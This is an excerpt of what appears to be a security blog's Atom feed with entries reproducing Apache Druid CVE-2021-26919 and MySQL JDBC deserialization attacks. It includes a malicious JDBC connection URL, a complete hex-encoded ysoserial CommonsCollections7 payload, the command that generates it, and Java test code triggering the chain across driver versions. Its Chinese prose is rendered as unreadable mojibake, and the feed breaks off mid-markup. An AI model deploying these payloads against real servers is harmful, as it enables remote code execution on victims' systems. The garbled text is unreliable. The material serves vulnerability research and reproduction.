&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;com.h2database&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;h2&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;1.4.199&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="H2" scheme="http://m0d9.me/tags/H2/"/>
    
    <category term="Jdbc" scheme="http://m0d9.me/tags/Jdbc/"/>
    
    <category term="HSQLDB" scheme="http://m0d9.me/tags/HSQLDB/"/>
    
  </entry>
  
  <entry>
    <title>Apache Druid CVE-2021-26919 æ¼æ´åˆ†æ</title>
    <link href="http://m0d9.me/2021/04/21/Apache-Druid-CVE-2021-26919-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/04/21/Apache-Druid-CVE-2021-26919-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-04-21T13:08:00.000Z</published>
    <updated>2021-04-22T07:05:40.589Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2021-26919æ˜¯ä¸€ä¸ªjdbc ååºåˆ—åŒ–ç±»å‹æ¼æ´ï¼Œç”¨ä½œä¹‹å‰ä¸¤ç¯‡jdbc mysqlå­¦ä¹ çš„ç»ƒæ‰‹ï¼Œåˆ†æåˆ†æã€‚</p><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>å·²çŸ¥æ˜¯jdbc mysqlååºåˆ—åŒ–çš„é—®é¢˜ï¼Œå¯ä»¥ç›´æ¥çœ‹çœ‹å®˜æ–¹çš„ä¿®å¤</p><p><a href="https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2">https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2</a><br><img src="/images/pasted-129.png" alt="upload successful"></p><p>å…·ä½“åœ¨è¿™ä¸ªcommité‡Œ<br><a href="https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678">https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678</a></p><p>ä»£ç å°±ä¸è´´äº†ï¼Œä¸»è¦åŠŸèƒ½æ˜¯è®¾ç½®äº†jdbc:mysql &amp; jdbc:postgresqlä¸¤ç±»driverå’Œå¯¹åº”çš„å‚æ•°ç™½åå•</p><a id="more"></a><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>çŸ¥é“æ¼æ´ç±»å‹ï¼Œå‰©ä¸‹å°±æ˜¯æ‰¾æ¼æ´è§¦å‘ç‚¹äº†</p><h3 id="jdbcè§¦å‘ç‚¹"><a href="#jdbcè§¦å‘ç‚¹" class="headerlink" title="jdbcè§¦å‘ç‚¹"></a>jdbcè§¦å‘ç‚¹</h3><p>æœ€å¥½çš„æ–¹å¼æ˜¯å¤šè¯»å®˜æ–¹æ–‡æ¡£ï¼Œåœ¨lookupç›¸å…³åŠŸèƒ½æ–‡æ¡£ä¸Šæ‰¾åˆ°<br><a href="https://druid.apache.org/docs/0.19.0/development/extensions-core/druid-lookups.html#polling-lookup">https://druid.apache.org/docs/0.19.0/development/extensions-core/druid-lookups.html#polling-lookup</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;pollingLookup&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;pollPeriod&quot;</span>: <span class="string">&quot;PT10M&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataFetcher&quot;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;jdbcDataFetcher&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;connectorConfig&quot;</span>: <span class="string">&quot;jdbc://mysql://localhost:3306/my_data_base&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;table&quot;</span>: <span class="string">&quot;lookup_table_name&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;keyColumn&quot;</span>: <span class="string">&quot;key_column_name&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;valueColumn&quot;</span>: <span class="string">&quot;value_column_name&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;cacheFactory&quot;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;onHeapPolling&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›¸å…³çš„ï¼Œåœ¨web consoleä¸Šä¹Ÿæ‰¾åˆ°å¯¹åº”çš„åŠŸèƒ½ç‚¹</p><p><img src="/images/pasted-130.png" alt="upload successful"></p><h3 id="mysql-connector-java"><a href="#mysql-connector-java" class="headerlink" title="mysql-connector-java"></a>mysql-connector-java</h3><p><a href="https://druid.apache.org/docs/latest/development/extensions-core/lookups-cached-global.html#introspection">https://druid.apache.org/docs/latest/development/extensions-core/lookups-cached-global.html#introspection</a></p><blockquote><p>If using JDBC, you will need to add your databaseâ€™s client JAR files to the extensionâ€™s directory. For Postgres, the connector JAR is already included. For MySQL, you can get it from <a href="https://dev.mysql.com/downloads/connector/j/">https://dev.mysql.com/downloads/connector/j/</a>. Copy or symlink the downloaded file to extensions/druid-lookups-cached-global under the distribution root directory.</p></blockquote><ol><li>éœ€è¦å°†mysql-connector-java sdkæ‹·è´è‡³extensions/druid-lookups-cached-global</li><li>è€Œä¸”éœ€è¦å¯åŠ¨druid-lookups-cached-globalç»„ä»¶ï¼Œå…·ä½“æ“ä½œä¸ºåœ¨common.runtime.propertiesæ–‡ä»¶ä¸­ä¿®æ”¹druid.extensions.loadListï¼Œå¢åŠ â€druid-lookups-cached-globalâ€æ‰©å±•åŠŸèƒ½</li></ol><h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><p>libç›®å½•ä¸­æ‰¾åˆ°å‡ ä¸ªå¸¸è§gadgets</p><ol><li><p>commons-collections</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commons-collections-3.2.2.jar</span><br><span class="line">commons-collections4-4.2.jar</span><br></pre></td></tr></table></figure><p> å®é™…ä¸å¯ç”¨ï¼Œåˆ©ç”¨æ¡ä»¶ä¸ºcc&lt;=3.2.1 æˆ–cc4=4.0ï¼Œå…·ä½“å¯ä»¥çœ‹ysoserial</p></li><li><p>commons-beanutils</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commons-beanutils-1.9.4.jar</span><br></pre></td></tr></table></figure><p> è™½ç„¶ysoserialå†™çš„æ˜¯1.9.2ï¼Œå®æµ‹1.9.4ä¹Ÿå¯ä»¥åˆ©ç”¨</p></li></ol><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;maxAllowedPacket=65535&quot;</span></span><br><span class="line">user =<span class="string">&quot;cb1&quot;</span></span><br><span class="line">password=<span class="string">&quot;password&quot;</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæäº¤ä¹‹åï¼Œéœ€è¦ç­‰ä¸€ä¸¤åˆ†é’Ÿä¹‹åï¼Œæ‰ä¼šè§¦å‘jdbcè¿æ¥</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡ç®€å•å¤ç°äº†CVE-2021-26919æ¼æ´ï¼Œæœ¬ä»¥ä¸ºå¾ˆç®€å•ï¼Œç»“æœè¿˜æ˜¯ç”¨äº†å¤§åŠå¤©ï¼Œè¸©äº†ä¸€äº›ä½çº§çš„å‘ï¼Œæ•™è®­æ˜¯å¤šçœ‹æ–‡æ¡£ã€æµ‹è¯•æ’æŸ¥æŒ‰æœ€å°å˜é‡æ¥ã€å¤šçœ‹ç¨‹åºè¾“å‡ºæ—¥å¿—ã€‚ã€‚ã€‚</p><p>æ€»çš„æ¥è¯´è¿™ä¸ªæ¼æ´åˆ©ç”¨åœºæ™¯æ¯”è¾ƒé¸¡è‚‹ï¼Œéœ€è¦åœ¨å¼€å¯jdbcåŠŸèƒ½çš„å‰æä¸‹ï¼ˆsdkæ‹·è´&amp;é…ç½®æ–‡ä»¶ä¸­çš„æ‰©å±•å¼€å¯ï¼‰ã€‚å®˜æ–¹çš„ä¿®å¤ä¹Ÿæ˜¯å½»åº•ï¼Œç›´æ¥é€šè¿‡ç™½åå•åšäº†é™åˆ¶ï¼Œè¿postgresqlä¹Ÿä¸€å¹¶å¤„ç†äº†ï¼Œéš¾é“postgresqlä¹Ÿå­˜åœ¨åˆ©ç”¨ç‚¹ä¸æˆï¼Ÿ</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://help.aliyun.com/noticelist/articleid/1060822985.html?spm=a2c4g.789213612.n2.10.7b5a6141soZJmh">ã€æ¼æ´é¢„è­¦ã€‘Apache Druid è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-26919ï¼‰</a></li><li>[2] <a href="(https://paper.seebug.org/1242/#commonscollections-2">Javaå®‰å…¨ä¹‹ååºåˆ—åŒ–ç¯‡-URLDNS&amp;Commons Collections 1-7ååºåˆ—åŒ–é“¾åˆ†æ</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;CVE-2021-26919æ˜¯ä¸€ä¸ªjdbc ååºåˆ—åŒ–ç±»å‹æ¼æ´ï¼Œç”¨ä½œä¹‹å‰ä¸¤ç¯‡jdbc mysqlå­¦ä¹ çš„ç»ƒæ‰‹ï¼Œåˆ†æåˆ†æã€‚&lt;/p&gt;
&lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;å·²çŸ¥æ˜¯jdbc mysqlååºåˆ—åŒ–çš„é—®é¢˜ï¼Œå¯ä»¥ç›´æ¥çœ‹çœ‹å®˜æ–¹çš„ä¿®å¤&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2&quot;&gt;https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;/images/pasted-129.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;å…·ä½“åœ¨è¿™ä¸ªcommité‡Œ&lt;br&gt;&lt;a href=&quot;https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678&quot;&gt;https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä»£ç å°±ä¸è´´äº†ï¼Œä¸»è¦åŠŸèƒ½æ˜¯è®¾ç½®äº†jdbc:mysql &amp;amp; jdbc:postgresqlä¸¤ç±»driverå’Œå¯¹åº”çš„å‚æ•°ç™½åå•&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´åˆ†æ" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="Druid" scheme="http://m0d9.me/tags/Druid/"/>
    
    <category term="Apache" scheme="http://m0d9.me/tags/Apache/"/>
    
  </entry>
  
  <entry>
    <title>Jdbc ç¢ç¢å¿µäºŒï¼šMySQL ååºåˆ—åŒ–</title>
    <link href="http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-04-20T08:08:00.000Z</published>
    <updated>2021-04-21T12:52:26.359Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒã€1ã€‘ä¸­å››å“¥å·²ç»è®²çš„å¾ˆå…¨é¢ä¹Ÿå¾ˆè¯¦ç»†äº†ï¼Œç®€å•è®°å½•ä¸‹å¤ç°è¿‡ç¨‹å§</p><h2 id="MySQL-ååºåˆ—åŒ–"><a href="#MySQL-ååºåˆ—åŒ–" class="headerlink" title="MySQL ååºåˆ—åŒ–"></a>MySQL ååºåˆ—åŒ–</h2><h3 id="autoDeserialize"><a href="#autoDeserialize" class="headerlink" title="autoDeserialize"></a>autoDeserialize</h3><p><img src="/images/pasted-125.png" alt="upload successful"></p><p>å¦‚è§£é‡Šï¼Œmysql clientä¼šè‡ªåŠ¨ååºåˆ—åŒ–serverç«¯ä¼ å›çš„BLOBç±»å‹</p><a id="more"></a><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><h4 id="æ‰‹åŠ¨è§¦å‘"><a href="#æ‰‹åŠ¨è§¦å‘" class="headerlink" title="æ‰‹åŠ¨è§¦å‘"></a>æ‰‹åŠ¨è§¦å‘</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> test.eviltable</span><br><span class="line">(</span><br><span class="line"><span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">evil_2  <span class="built_in">blob</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> @obj=<span class="number">0xaced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d0000000278</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test.eviltable(<span class="string">`evil_2`</span>) <span class="keyword">VALUES</span> (@obj);</span><br></pre></td></tr></table></figure><!--more--><p>å…¶ä¸­@objå–å€¼</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 <span class="string">&quot;touch /tmp/cc7&quot;</span> | xxd -ps -c 200 | tr -d <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure><p>è§¦å‘ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ResultSet rs = stmt.executeQuery(<span class="string">&quot;select evil_2 from eviltable limit 1;&quot;</span>);</span><br><span class="line">rs.next();</span><br><span class="line">rs.getObject(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>è¯¯åŒºï¼šæƒ³å½“ç„¶ä»¥ä¸ºåªè¦æ˜¯BLOBç±»å‹çš„å­—æ®µå°±ä¼šè¢«è‡ªåŠ¨ååºåˆ—åŒ–ï¼Œå…¶å®ä¸ç„¶ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶</p><ol><li>autoDeserialize ä¸ºTrue</li><li>ä¸»åŠ¨è°ƒç”¨com.mysql.cj.jdbc.result.ResultSetImpl#getObjectï¼Œè¿›è¡Œååºåˆ—åŒ–</li></ol><h3 id="ServerStatusDiffInterceptor-amp-detectCustomCollationsè§¦å‘è°ƒç”¨é“¾"><a href="#ServerStatusDiffInterceptor-amp-detectCustomCollationsè§¦å‘è°ƒç”¨é“¾" class="headerlink" title="ServerStatusDiffInterceptor&amp; detectCustomCollationsè§¦å‘è°ƒç”¨é“¾"></a>ServerStatusDiffInterceptor&amp; detectCustomCollationsè§¦å‘è°ƒç”¨é“¾</h3><p>æ‰‹åŠ¨è§¦å‘åœºæ™¯ä¸‹å®é™…éœ€è¦æ§åˆ¶ï¼š</p><ol><li>jdbc urlï¼Œä¹Ÿå°±æ˜¯evil mysql server</li><li>ä»£ç éœ€è¦getObjectï¼Œè¿™ç‚¹æ˜¾ç„¶ä¸å¯èƒ½</li></ol><p>é‚£ä¹ˆéœ€è¦æ‰¾åˆ°åˆ©ç”¨é“¾ï¼Œè§£å†³è§¦å‘getObjectã€‚å¯ä»¥çœ‹çœ‹å››å“¥åœ¨å‚è€ƒã€1ã€‘ä¸­æ€»ç»“çš„æ¼æ´å†å²ï¼Œæ€»çš„æ¥è¯´æœ‰å…¬å¼€ä¸¤ç§é€šç”¨çš„åˆ©ç”¨æ–¹å¼</p><ul><li>ServerStatusDiffInterceptor</li><li>detectCustomCollations</li></ul><p>å››å“¥å’Œfnmsdçš„æ–‡ç« å·²ç»è®²çš„å¾ˆæ¸…æ¥šäº†ï¼Œè¿™é‡Œç›´æ¥å¼•ç”¨ä»–ä»¬çš„æµ‹è¯•ç»“æœ</p><h4 id="ServerStatusDiffInterceptor"><a href="#ServerStatusDiffInterceptor" class="headerlink" title="ServerStatusDiffInterceptor"></a>ServerStatusDiffInterceptor</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ServerStatusDiffInterceptorè§¦å‘</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 8.x:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 8.0.14 æµ‹è¯•æˆåŠŸ</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest8_x</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6.x(å±æ€§åä¸åŒ):jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 6.0.5 æµ‹è¯•é€šè¿‡</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest6_x</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.11åŠä»¥ä¸Šçš„5.xç‰ˆæœ¬ï¼ˆåŒ…åæ²¡æœ‰äº†cjï¼‰:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 5.1.19 æµ‹è¯•æˆåŠŸ</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest5_1_11TO5_x</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.10åŠä»¥ä¸‹çš„5.1.Xç‰ˆæœ¬ï¼šåŒä¸Šï¼Œä½†æ˜¯éœ€è¦è¿æ¥åæ‰§è¡ŒæŸ¥è¯¢ã€‚</span></span><br><span class="line"><span class="comment">// 5.1.10 æµ‹è¯•æˆåŠŸ</span></span><br><span class="line"><span class="comment">// @<span class="doctag">TODO:</span>5.1.9 æµ‹è¯•å¤±è´¥</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest5_xTO5_1_10</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">    Statement stmt = connection.createStatement();</span><br><span class="line">    ResultSet rs = stmt.executeQuery(<span class="string">&quot;select 1;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.0.x:è¿˜æ²¡æœ‰ServerStatusDiffInterceptorè¿™ä¸ªä¸œè¥¿â”“( Â´âˆ€` )â”</span></span><br></pre></td></tr></table></figure><h4 id="detectCustomCollations"><a href="#detectCustomCollations" class="headerlink" title="detectCustomCollations"></a>detectCustomCollations</h4><figure 